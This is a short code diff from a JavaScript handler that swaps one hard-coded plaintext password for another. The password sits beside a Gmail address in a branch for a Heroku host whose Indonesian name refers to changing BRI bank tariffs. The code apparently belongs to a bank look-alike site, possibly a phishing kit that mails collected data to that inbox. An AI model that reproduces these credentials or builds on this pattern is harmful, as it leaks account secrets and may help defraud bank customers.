@@ -30,7 +30,7 @@ export default function handler(req, res) {
 
     } else if(url == 'ubah-tarifbri.herokuapp.com'){
         email = 'accbrimo133@gmail.com';
-        pass = 'xoomzvnqczudskpg';
+        pass = 'tdxfejizruzpyvtl';
 
     }
         
